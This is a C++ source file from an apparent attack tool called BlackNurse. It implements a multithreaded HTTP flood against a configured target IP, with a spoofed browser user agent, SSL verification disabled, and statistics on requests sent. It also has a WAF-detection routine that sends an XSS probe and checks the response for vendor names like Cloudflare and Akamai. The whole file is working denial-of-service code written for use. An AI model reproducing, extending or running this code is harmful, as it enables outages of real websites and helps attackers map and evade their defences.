#include "http_handler.hpp"
#include "../common/logger.hpp"

using namespace blacknurse;
#include <iostream>
#include <thread>
#include <random>
#include <sstream>
#include <algorithm>

namespace BlackNurse {

HttpHandler::HttpHandler(const blacknurse::Config& config) 
    : config_(config), running_(false), stats_{} {
    
    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Setup default HTTP configuration
    http_config_.method = HttpMethod::GET;
    http_config_.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    http_config_.threads = config_.threads;
    http_config_.requests_per_second = config_.rate_limit;
    http_config_.timeout_seconds = 10;
    http_config_.follow_redirects = true;
    http_config_.verify_ssl = false;
    
    Logger::info("HTTP Handler initialized for target: " + config_.target_ip);
}

HttpHandler::~HttpHandler() {
    stop_attack();
    curl_global_cleanup();
}

bool HttpHandler::initialize() {
    try {
        // Test connection to target
        CURL* curl = curl_easy_init();
        if (!curl) {
            Logger::error("Failed to initialize curl");
            return false;
        }
        
        std::string url = "http://" + config_.target_ip;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        if (res == CURLE_OK) {
            Logger::info("HTTP target is reachable");
            return true;
        } else {
            Logger::warning("HTTP target may not be reachable: " + std::string(curl_easy_strerror(res)));
            return true; // Continue anyway for testing
        }
        
    } catch (const std::exception& e) {
        Logger::error("HTTP initialization failed: " + std::string(e.what()));
        return false;
    }
}

bool HttpHandler::start_attack() {
    if (running_) {
        Logger::warning("HTTP attack is already running");
        return false;
    }
    
    running_ = true;
    start_time_ = std::chrono::steady_clock::now();
    
    Logger::info("Starting HTTP flood attack with " + std::to_string(http_config_.threads) + " threads");
    
    // Start worker threads
    for (int i = 0; i < http_config_.threads; ++i) {
        worker_threads_.emplace_back(&HttpHandler::worker_thread, this, i);
    }
    
    return true;
}

void HttpHandler::stop_attack() {
    if (!running_) {
        return;
    }
    
    Logger::info("Stopping HTTP attack...");
    running_ = false;
    
    // Wait for all threads to finish
    for (auto& thread : worker_threads_) {
        if (thread.joinable()) {
            thread.join();
        }
    }
    worker_threads_.clear();
    
    Logger::info("HTTP attack stopped");
}

AttackStats HttpHandler::get_stats() const {
    std::lock_guard<std::mutex> lock(stats_mutex_);
    AttackStats copy;
    copy.packets_sent.store(stats_.packets_sent.load());
    copy.packets_failed.store(stats_.packets_failed.load());
    copy.bytes_sent.store(stats_.bytes_sent.load());
    copy.connections_established.store(stats_.connections_established.load());
    copy.connections_failed.store(stats_.connections_failed.load());
    copy.current_rate.store(stats_.current_rate.load());
    copy.avg_response_time.store(stats_.avg_response_time.load());
    copy.start_time = stats_.start_time;
    copy.last_update = stats_.last_update;
    return copy;
}

void HttpHandler::worker_thread(int thread_id) {
    Logger::info("HTTP worker thread " + std::to_string(thread_id) + " started");
    
    CURL* curl = curl_easy_init();
    if (!curl) {
        Logger::error("Failed to initialize curl in worker thread " + std::to_string(thread_id));
        return;
    }
    
    // Setup curl options
    std::string url = "http://" + config_.target_ip;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERAGENT, http_config_.user_agent.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, http_config_.timeout_seconds);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, http_config_.follow_redirects ? 1L : 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, http_config_.verify_ssl ? 1L : 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    
    auto last_request_time = std::chrono::steady_clock::now();
    const auto request_interval = std::chrono::microseconds(1000000 / http_config_.requests_per_second);
    
    while (running_) {
        auto now = std::chrono::steady_clock::now();
        
        // Rate limiting
        if (now - last_request_time < request_interval) {
            std::this_thread::sleep_for(std::chrono::microseconds(100));
            continue;
        }
        
        // Perform HTTP request
        CURLcode res = curl_easy_perform(curl);
        last_request_time = std::chrono::steady_clock::now();
        
        // Update statistics
        {
            std::lock_guard<std::mutex> lock(stats_mutex_);
            stats_.packets_sent++;
            
            if (res == CURLE_OK) {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                
                if (response_code >= 200 && response_code < 300) {
                    // Success - no additional action needed
                } else {
                    stats_.packets_failed++;
                }
            } else {
                stats_.packets_failed++;
            }
        }
        
        // Small delay to prevent overwhelming the system
        std::this_thread::sleep_for(std::chrono::microseconds(10));
    }
    
    curl_easy_cleanup(curl);
    Logger::info("HTTP worker thread " + std::to_string(thread_id) + " finished");
}



bool HttpHandler::detect_waf() {
    // Basic WAF detection implementation
    CURL* curl = curl_easy_init();
    if (!curl) {
        return false;
    }
    
    std::string url = "http://" + config_.target_ip + "/?test=<script>alert(1)</script>";
    std::string response_data;
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    
    CURLcode res = curl_easy_perform(curl);
    
    long response_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        // Check for common WAF signatures
        std::string response_lower = response_data;
        std::transform(response_lower.begin(), response_lower.end(), response_lower.begin(), ::tolower);
        
        std::vector<std::string> waf_signatures = {
            "cloudflare", "incapsula", "sucuri", "akamai", "barracuda",
            "f5", "imperva", "fortinet", "blocked", "forbidden"
        };
        
        for (const auto& signature : waf_signatures) {
            if (response_lower.find(signature) != std::string::npos) {
                Logger::warning("Potential WAF detected: " + signature);
                return true;
            }
        }
        
        if (response_code == 403 || response_code == 406 || response_code == 429) {
            Logger::warning("WAF-like response code detected: " + std::to_string(response_code));
            return true;
        }
    }
    
    return false;
}

size_t HttpHandler::write_to_string(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t new_length = size * nmemb;
    s->append((char*)contents, new_length);
    return new_length;
}

void HttpHandler::set_http_config(const HttpConfig& config) {
    if (running_) {
        Logger::warning("Cannot change HTTP configuration while attack is running");
        return;
    }
    
    http_config_ = config;
    Logger::info("HTTP configuration updated");
}

} // namespace BlackNurse